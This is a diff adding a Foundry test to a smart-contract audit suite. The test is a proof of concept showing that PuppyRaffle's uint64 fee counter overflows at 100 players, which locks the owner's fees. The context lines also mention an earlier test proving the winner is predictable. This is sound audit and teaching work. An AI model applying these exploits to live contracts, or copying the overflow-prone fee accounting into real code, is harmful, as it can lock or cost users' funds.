@@ -360,4 +360,52 @@ contract PuppyRaffleTest is Test {
         console.log("PROOF: The winner was known before selectWinner() was called.");
         console.log("A fair raffle cannot be predicted. This one can.");
     }
+
+    //////////////////////
+    /// H-3 uint64 Overflow PoC ///
+    /////////////////////
+
+    function test_totalFeesOverflow() public {
+        // uint64 max = 18,446,744,073,709,551,615 (~18.44 ETH in wei)
+        // fee = 20% of total entrance
+        // 100 players × 1 ETH = 100 ETH total → fee = 20 ETH → overflows uint64
+
+        uint256 numPlayers = 100;
+        address[] memory bigPlayers = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            bigPlayers[i] = address(uint160(i + 10)); // address(10) .. address(109)
+        }
+
+        uint256 totalEntrance = entranceFee * numPlayers; // 100 ETH
+        vm.deal(address(this), totalEntrance);
+        puppyRaffle.enterRaffle{value: totalEntrance}(bigPlayers);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner(); // 80 ETH to winner, 20 ETH fee stays in contract
+
+        // --- What the fee SHOULD be ---
+        uint256 expectedFee = (totalEntrance * 20) / 100; // 20e18 wei = 20 ETH
+
+        // --- What totalFees actually stored (silently truncated by uint64 cast) ---
+        uint64 storedFees = puppyRaffle.totalFees();
+
+        console.log("---------- H-3: UINT64 OVERFLOW ----------");
+        emit log_named_uint("Expected fee (wei)        ", expectedFee);
+        emit log_named_uint("Stored totalFees (wei)    ", uint256(storedFees));
+        emit log_named_uint("uint64 max (wei)          ", type(uint64).max);
+        emit log_named_uint("Contract ETH balance (wei)", address(puppyRaffle).balance);
+
+        // PROOF 1: stored fees are far less than reality due to uint64 overflow
+        assertLt(uint256(storedFees), expectedFee, "Overflow did not occur");
+
+        // PROOF 2: owner CANNOT withdraw fees — balance != totalFees
+        // The contract holds 20 ETH but totalFees shows ~1.55 ETH → strict equality fails
+        // Fees are permanently locked even though the raffle has ended
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+        console.log("CONFIRMED: totalFees overflowed. Owner fees are permanently locked.");
+        console.log("------------------------------------------");
+    }
 }
